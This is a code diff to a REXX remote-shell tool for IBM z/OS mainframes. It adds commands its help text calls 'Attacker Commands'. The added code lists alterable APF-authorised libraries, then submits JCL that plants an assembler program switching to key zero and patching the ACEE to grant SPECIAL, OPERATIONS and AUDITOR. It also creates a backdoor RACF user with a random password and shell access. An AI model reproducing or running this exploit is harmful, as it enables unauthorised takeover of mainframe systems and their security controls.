@@ -64,7 +64,7 @@
 /* Uncomment this line to turn on debugging */
 /* TRACE I */
 /* change verbose to 1 to see results on the screen */
-verbose = 0
+verbose = 1
  
 if verbose then say ''
 if verbose then say ''
@@ -236,6 +236,12 @@ parse var do_it do_it do_commands
           if verbose then say '[!] Sending OS Info'
           terp = SOCKET('SEND',sockID, send_it||NEWLINE)
         END
+        WHEN do_it = 'apf' THEN
+        DO
+          send_it = list_apf()
+          if verbose then say '[!] Sending APF Info'
+          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
+        END
         WHEN do_it = 'cat' THEN
         DO
           send_it = CAT_FILE(do_commands)
@@ -322,6 +328,18 @@ parse var do_it do_it do_commands
           if verbose then say '[!] Sending RACF Database Dataset Name'
           terp = SOCKET('SEND',sockID, send_it||NEWLINE)
         END
+        WHEN do_it = 'privesc' THEN
+        DO
+          send_it = PRIVESC(do_commands)
+          if verbose then say '[!] Sending RACF Database Dataset Name'
+          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
+        END
+        WHEN do_it = 'adduser' THEN
+        DO
+          send_it = ADDUSER(do_commands)
+          if verbose then say '[!] Sending RACF Database Dataset Name'
+          terp = SOCKET('SEND',sockID, send_it||NEWLINE)
+        END
         WHEN do_it = 'help' THEN
         DO
           send_it = GET_HELP()
@@ -367,7 +385,7 @@ parse arg socket_to_use
      chopper = DELSTR(s_data_text, LENGTH(s_data_text))
   return chopper
  
- 
+
 GET_UID: /* returns the UID */
    text = NEWLINE||"Mainframe userID: "||userid()||NEWLINE
    return text
@@ -609,7 +627,350 @@ UPPER:
 /* Of all the built-in functions, this isn't one of them */
     PARSE UPPER ARG STRINGED
     return STRINGED
- 
+
+LOWER: procedure
+  parse arg string
+  return TRANSLATE(string, xrange('a','z'), xrange('A','Z'))
+
+PRIVESC:
+   parse arg dsn_apf
+   if dsn_apf ='' then
+     return("! apf authorized dataset name required" newline)
+
+    t = apf_privesc(dsn_apf)
+    return(t)
+   
+
+ADDUSER:
+   parse arg dsn_apf
+   if dsn_apf ='' then
+     return("! apf authorized dataset name required" newline)
+
+    t = apd_add_user(dsn_apf)
+    return(t)
+
+
+apf_privesc:
+    parse arg dsn_input
+    call listdsi "'"dsn_input"'"
+
+    if sysdsorg <> "PO" then do
+        return("! Cannot find APF Library '"dsn_input"', or not PDS")
+        
+    end
+
+    priv  =  check_priv(dsn_input)
+
+    if (priv == "NONE") then do
+        return("! Not enough privileges to alter APF library "dsn_input)
+    end
+
+    if (priv == "READ") then do
+        return("! Not enough privileges to alter APF library "dsn_input)
+    end
+    if priv=="NO RACF PROFILE" then do
+        text =  "! Warning: No RACF profile defined for"||,
+   ""dsn_input", might not be uptable" 
+    end
+
+    t = launch_payload(dsn_input)
+
+  return(text||newline||t)
+
+launch_payload:
+    APF_DSN = arg(1)
+    PROG = rand_char(6)
+    reply =  "+ Compiling " PROG "in" dsn_input newline
+    QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
+    QUEUE "//*"
+    QUEUE "//BUILD   EXEC ASMACL"
+    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
+    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
+    QUEUE "//C.SYSIN   DD *"
+    QUEUE "       CSECT"
+    QUEUE "       AMODE 31"
+    QUEUE "       STM 14,12,12(13)"
+    QUEUE "       BALR 12,0"
+    QUEUE "       USING *,12"
+    QUEUE "       ST 13,SAVE+4"
+    QUEUE "       LA 13,SAVE"
+    QUEUE "*"
+    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
+    QUEUE "       L 5,X'224'           POINTER TO ASCB"
+    QUEUE "       L 5,X'6C'(5)         POINTER TO ASXB"
+    QUEUE "       L 5,X'C8'(5)         POINTER TO ACEE"
+    QUEUE "       NI X'26'(5),X'00'"
+    QUEUE "       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR"
+    QUEUE "       NI X'27'(5),X'00'"
+    QUEUE "       OI X'27'(5),X'80'    ALTER ACCESS"
+    QUEUE "*"
+    QUEUE "       L 13,SAVE+4"
+    QUEUE "       LM 14,12,12(13)"
+    QUEUE "       XR 15,15"
+    QUEUE "       BR 14"
+    QUEUE "*"
+    QUEUE "SAVE   DS 18F"
+    QUEUE "    END"
+    QUEUE "/*"
+    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||APF_DSN||""
+    QUEUE "//L.SYSIN   DD *"
+    QUEUE "  SETCODE AC(1)"
+    QUEUE "  NAME "||PROG||"(R)"
+    QUEUE "/*"
+    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
+    QUEUE "//STEPLIB   DD DSN="||APF_DSN||",DISP=SHR"
+    QUEUE "//STEP02 EXEC PGM=IKJEFT01,COND=(0,NE)"
+    QUEUE "//SYSTSIN DD *"
+    QUEUE " ALU "||userid()||" SPECIAL OPERATIONS"
+    QUEUE "/*"
+    QUEUE "//SYSIN   DD DUMMY"
+    QUEUE "//SYSTSPRT DD SYSOUT=*"
+    QUEUE "//*"
+    QUEUE "$$"
+
+    o = OUTTRAP("output.",,"CONCAT")
+    address tso "SUBMIT * END($$)"
+    o = OUTTRAP(OFF)
+
+    return(reply)
+
+
+apd_add_user:
+    APF_DSN = arg(1)
+    PROG = rand_char(6)
+    USER = rand_char(8)
+    PASS = rand_char(8)
+    USERUC = UPPER(USER)
+    USERLC = LOWER(USER)
+    reply =  "+ Compiling " PROG "in" APF_DSN newline
+    QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
+    QUEUE "//*"
+    QUEUE "//BUILD   EXEC ASMACL"
+    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
+    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
+    QUEUE "//C.SYSIN   DD *"
+    QUEUE "       CSECT"
+    QUEUE "       AMODE 31"
+    QUEUE "       STM 14,12,12(13)"
+    QUEUE "       BALR 12,0"
+    QUEUE "       USING *,12"
+    QUEUE "       ST 13,SAVE+4"
+    QUEUE "       LA 13,SAVE"
+    QUEUE "*"
+    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
+    QUEUE "       L 5,X'224'           POINTER TO ASCB"
+    QUEUE "       L 5,X'6C'(5)         POINTER TO ASXB"
+    QUEUE "       L 5,X'C8'(5)         POINTER TO ACEE"
+    QUEUE "       NI X'26'(5),X'00'"
+    QUEUE "       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR"
+    QUEUE "       NI X'27'(5),X'00'"
+    QUEUE "       OI X'27'(5),X'80'    ALTER ACCESS"
+    QUEUE "*"
+    QUEUE "       L 13,SAVE+4"
+    QUEUE "       LM 14,12,12(13)"
+    QUEUE "       XR 15,15"
+    QUEUE "       BR 14"
+    QUEUE "*"
+    QUEUE "SAVE   DS 18F"
+    QUEUE "    END"
+    QUEUE "/*"
+    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||APF_DSN||""
+    QUEUE "//L.SYSIN   DD *"
+    QUEUE "  SETCODE AC(1)"
+    QUEUE "  NAME "||PROG||"(R)"
+    QUEUE "/*"
+    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
+    QUEUE "//STEPLIB   DD DSN="||APF_DSN||",DISP=SHR"
+    QUEUE "//************************************************ "
+    QUEUE "//* "
+    QUEUE "//* Create a user with a random password, TSO and OMVS segments "
+    QUEUE "//* "
+    QUEUE "//************************************************"
+    QUEUE "//*-----------------------------------------------"
+    QUEUE "//*-----------------------------------------------"
+    QUEUE "//* Define symbols for the job steps "
+    QUEUE "//E1       EXPORT SYMLIST=(USERUC,USERLC,NAME,MAINGRP,INSTID)"
+    QUEUE "//S1          SET USERUC="||USERUC||""
+    QUEUE "//S2          SET USERLC='"||USERLC||"'"
+    QUEUE "//S4          SET MAINGRP=MYGROUP"
+    QUEUE "//S4          SET INSTID=CUS"
+    QUEUE "//S3          SET NAME='Hacked'"
+    QUEUE "//ADDUSER  EXEC PGM=IKJEFT01 "
+    QUEUE "//SYSTSPRT   DD SYSOUT=* "
+    QUEUE "//SYSTSIN    DD *,SYMBOLS=JCLONLY "
+    QUEUE "  ADDUSER &USERUC - "
+    QUEUE "    DFLTGRP(&MAINGRP) - "
+    QUEUE "    OWNER(IBMUSER) - "
+    QUEUE "    NAME('&NAME') - "
+    QUEUE "    PASSWORD("||PASS||") - "
+    QUEUE "    TSO( - "
+    QUEUE "        ACCTNUM(ACCT#) - "
+    QUEUE "        PROC(ISPFPROC) - "
+    QUEUE "        COMMAND(ISPF) - "
+    QUEUE "       ) - "
+    QUEUE "    OMVS( - "
+    QUEUE "         AUTOUID - "
+    QUEUE "         HOME('/home/&USERLC') - "
+    QUEUE "         PROGRAM('/bin/sh') - "
+    QUEUE "        ) "
+    QUEUE ""
+    QUEUE "  ADDSD '&USERUC..*.**' UACC(NONE) "
+    QUEUE "  PERMIT '&USERUC..*.**' ACCESS(ALTER) ID(&USERUC) "
+    QUEUE "  ADDSD '&USERUC..**.ZFS' UACC(READ) "
+    QUEUE ""
+    QUEUE "  PERMIT ACCT# CLASS(ACCTNUM) ID (&USERUC) "
+    QUEUE ""
+    QUEUE "  PERMIT JCL CLASS(TSOAUTH) ID(&USERUC) ACCESS(READ) "
+    QUEUE ""
+    QUEUE "  SETROPTS GENERIC(DATASET) REFRESH "
+    QUEUE "  SETROPTS RACLIST(TSOAUTH) REFRESH "
+    QUEUE "  ALU &USERUC SPECIAL OPER "
+    QUEUE "//*------------------------------------------------------"
+    QUEUE "//* Create an alias in the usercatalog, so the user can create DS "
+    QUEUE "//CATALIAS EXEC PGM=IDCAMS "
+    QUEUE "//SYSPRINT   DD SYSOUT=* "
+    QUEUE "//SYSIN      DD *,SYMBOLS=JCLONLY "
+    QUEUE "  DEFINE ALIAS(NAME(&USERUC) RELATE(USERCAT.&INSTID)) "
+    QUEUE "//*-----------------------------------------------------"
+    QUEUE "//* Create ZFS for home directory "
+    QUEUE "//* Save the ZFS in a linerar VSAM cluster "
+    QUEUE "//* 50MB of initial allocation plus increments of 10MB "
+    QUEUE "//* The VSAM cluster is shareable "
+    QUEUE "//CREATEFS EXEC PGM=IDCAMS "
+    QUEUE "//SYSPRINT   DD SYSOUT=* "
+    QUEUE "//SYSIN      DD *,SYMBOLS=JCLONLY "
+    QUEUE "  DEFINE CLUSTER( - "
+    QUEUE "                 NAME(&USERUC..OMVSHOME.ZFS) - "
+    QUEUE "                 LINEAR - "
+    QUEUE "                 CYLINDERS(50 10) - "
+    QUEUE "                 SHAREOPTIONS(2) - "
+    QUEUE "                ) "
+    QUEUE "//*------------------------------------------------------------"
+    QUEUE "//* Format the ZFS "
+    QUEUE "//* Uses the Aggregate Format in the IOE segment "
+    QUEUE "//* Runs  IOEAGFMT in compatibility mode "
+    QUEUE "//FORMATFS EXEC PGM=IOEAGFMT,REGION=0M, "
+    QUEUE "//             PARM=('-aggregate &USERUC..OMVSHOME.ZFS -compat') "
+    QUEUE "//SYSPRINT   DD SYSOUT=* "
+    QUEUE "//STDOUT     DD SYSOUT=* "
+    QUEUE "//STDERR     DD SYSOUT=* "
+    QUEUE "//*"
+    QUEUE "$$"
+
+    o = OUTTRAP("output.",,"CONCAT")
+    address tso "SUBMIT * END($$)"
+    o = OUTTRAP(OFF)
+
+    reply = reply || "Added user" USERUC "with password" PASS
+
+    return(reply)
+
+rand_char:
+    length = arg(1)
+    out = ""
+    do counter=1 to length
+       i = RANDOM(1,3)
+       if i ==1 then out = out||D2C(RANDOM(193,201))
+       if i ==2 then out = out||D2C(RANDOM(226,233))
+       if i ==3 then out = out||D2C(RANDOM(209,217))
+    end
+    return out
+
+list_apf:
+    text = ''
+    NUMERIC  DIGITS 10
+    CVT      = C2d(Storage(10,4))                /* point to cvt */
+    GRSNAME  = Storage(D2x(CVT + 340),8)         /* point to system name */
+    GRSNAME  = Strip(GRSNAME,'T')                /* del trailing blanks  */
+    CVTAUTHL = C2d(Storage(D2x(CVT + 484),4))    /* point to auth lib tbl*/
+    If CVTAUTHL <> C2d('7FFFF001'x) then do      /* static list ?        */
+      NUMAPF   = C2d(Storage(D2x(CVTAUTHL),2))   /* # APF libs in table  */
+      APFOFF   = 2                               /* first ent in APF tbl */
+      Do I = 1 to NUMAPF
+         LEN = C2d(Storage(D2x(CVTAUTHL+APFOFF),1)) /* length of entry   */
+         VOL.I = Storage(D2x(CVTAUTHL+APFOFF+1),6)  /* VOLSER of APF LIB */
+         DSN.I = Storage(D2x(CVTAUTHL+APFOFF+1+6),LEN-6) /*DSN of APF lib*/
+         APFOFF = APFOFF + LEN +1
+      End
+    End
+    Else Do  /* dynamic APF list via PROGxx */
+      ECVT     = C2d(Storage(D2x(CVT + 140),4))  /* point to CVTECVT     */
+      ECVTCSVT = C2d(Storage(D2x(ECVT + 228),4)) /* point to CSV table   */
+      APFA = C2d(Storage(D2x(ECVTCSVT + 12),4))  /* APFA                 */
+      AFIRST = C2d(Storage(D2x(APFA + 8),4))     /* First entry          */
+      ALAST  = C2d(Storage(D2x(APFA + 12),4))    /* Last  entry          */
+      LASTONE = 0   /* flag for end of list      */
+      NUMAPF = 1    /* tot # of entries in list  */
+      /* Get the WARNING DATASETS. If they're on the APF list.....       */
+      W = OUTTRAP('OUTW.')
+      ADDRESS TSO "SEARCH ALL WARNING NOMASK"
+      W = OUTTRAP('OFF')
+      text = "+ Dataset --> Access" NEWLINE
+      Do forever
+         DSN.NUMAPF = Storage(D2x(AFIRST+24),44) /* DSN of APF library   */
+         DSN.NUMAPF = Strip(DSN.NUMAPF,'T')      /* remove blanks        */
+         PRIV.NUMAPF = check_priv(DSN.NUMAPF)
+         if PRIV.NUMAPF <> "ALTER" then do
+           /* We might push in via dataset in WARN mode */
+           do www = 1 to OUTW.0
+             if OUTW.www == DSN.NUMAPF then
+               /* It must be christmas!! */
+               PRIV.NUMAPF = "ALTER"
+           end
+         
+         text = text || "+" DSN.NUMAPF "-->" PRIV.NUMAPF NEWLINE
+         CKSMS = Storage(D2x(AFIRST+4),1)        /* DSN of APF library   */
+         if  bitand(CKSMS,'80'x)  = '80'x        /*  SMS data set?       */
+           then VOL.NUMAPF = '*SMS* '            /* SMS control dsn      */
+         else VOL.NUMAPF = Storage(D2x(AFIRST+68),6) /* VOLSER of APF lib*/
+         If Substr(DSN.NUMAPF,1,1) <> X2c('00')  /* check for deleted    */
+           then NUMAPF = NUMAPF + 1              /*   APF entry          */
+         AFIRST = C2d(Storage(D2x(AFIRST + 8),4)) /* next  entry          */
+         if LASTONE = 1 then leave
+         If  AFIRST = ALAST then LASTONE = 1
+      End
+      NUMAPF = NUMAPF-1
+End
+
+return text
+
+check_priv:
+  NOT_AUTH="NOT AUTHORIZED"
+  NO_PROFILE="NO RACF"
+  DSN = arg(1)
+
+  /* First we Check for a specific rule */
+  /* ICH35003I */
+  A = OUTTRAP('OUT.')
+    ADDRESS TSO "LD DA('"DSN"')"
+  B = OUTTRAP('OFF')
+  IF OUT.0==1 THEN DO
+    IF INDEX(OUT.1,"ICH35003I") >0 THEN DO
+      X = OUTTRAP('OUTG.')
+        ADDRESS TSO "LD DA('"DSN"') GEN"
+      Y = OUTTRAP('OFF')
+      IF OUTG.0==1 THEN DO
+        IF INDEX(OUTG.1,NOT_AUTH)>0 THEN
+          RETURN "NONE"
+        IF INDEX(OUTG.1,NO_PROFILE)>0 THEN
+          RETURN "NO RACF PROFILE"
+      END
+      ELSE IF OUTG.0>1 THEN DO
+        ACCESS = WORD(OUTG.17,1)
+        return ACCESS
+      END
+    END
+    IF INDEX(OUT.1,NOT_AUTH)>0 THEN
+      RETURN "NONE"
+    IF INDEX(OUT.1,NO_PROFILE)>0 THEN
+      RETURN "NO RACF PROFILE"
+  END
+  ELSE IF OUT.0>1 THEN DO
+    ACCESS = WORD(OUT.17,1)
+    return ACCESS
+  END
+return -1
+
 GET_HELP:
 /* Help command */
        help = NEWLINE,
@@ -646,6 +1007,8 @@ GET_HELP:
        "  -------           -----------"||NEWLINE,
        "  getuid            Get current user name"||NEWLINE,
        "  sysinfo           Remote system info (i.e OS)"||NEWLINE,
+       "  apf               Get list of APF authorised libraries",
+       NEWLINE,
        "  racf              Show password database location",
        NEWLINE,
        "  execute           Execute a TSO command"||NEWLINE,
@@ -656,5 +1019,11 @@ GET_HELP:
        NEWLINE,
        "                    an FTP server. Syntax is:"||NEWLINE,
        "                    host/ip user pass filename [binary]",
+       "Attacker Commands"||NEWLINE,
+       "==============="||NEWLINE||NEWLINE,
+       "  Command           Description"||NEWLINE,
+       "  -------           -----------"||NEWLINE,
+       "  privesc           Launch privesc to make a new user"||NEWLINE,
+       "  adduser           Adds a user",
        NEWLINE||NEWLINE
      return help
